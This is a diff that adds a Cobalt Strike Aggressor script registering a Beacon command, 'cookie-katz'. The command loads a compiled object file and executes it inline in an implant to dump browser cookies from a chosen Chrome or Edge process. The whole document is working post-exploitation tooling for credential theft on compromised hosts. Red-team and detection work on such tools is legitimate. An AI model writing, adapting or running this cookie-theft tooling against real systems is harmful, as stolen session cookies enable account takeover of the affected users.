@@ -1,0 +1,48 @@
+debug(7); # Show all warnings
+
+beacon_command_register(
+   "cookie-katz",
+   "Dump cookies from Chrome or Edge",
+   "Dump cookies from Chrome or Edge\n\nUse: [chrome|edge] [pid]"
+);
+
+alias cookie-katz {
+    local('$bid $browser $pid $pidStr $handle $data $args $path');
+    if (size(@_) != 3) {
+        berror($1, "Use: [chrome|edge] [pid]");
+        return;
+    }
+    else if (barch($1) eq "x86") {
+        berror($1, "Not a x64 beacon!");
+        return;
+    }
+
+    # Check arguments
+    ($bid, $browser, $pidStr) = @_;
+    if ($browser !in @("chrome", "edge")) {
+        berror($1, "Unsupported browser: '$browser $+ '");
+        return;
+    }
+
+    $pid = [Integer parseInt: $pidStr];
+    if ($pid is $null) {
+        berror($1, "Could not parse pid '$pidStr $+ '");
+        return;
+    }
+
+    # Read the BOF
+    $path = getFileProper(script_resource(""), "x64", "Release", "CookieKatzBOF.obj");
+    if (!-isFile $path) {
+        berror($1, "$path does not exist");
+        return;
+    }
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $args   = bof_pack($1, "zi", "/$browser", $pid);
+
+    # Execute it
+    beacon_inline_execute($1, $data, "go", $args);
+}
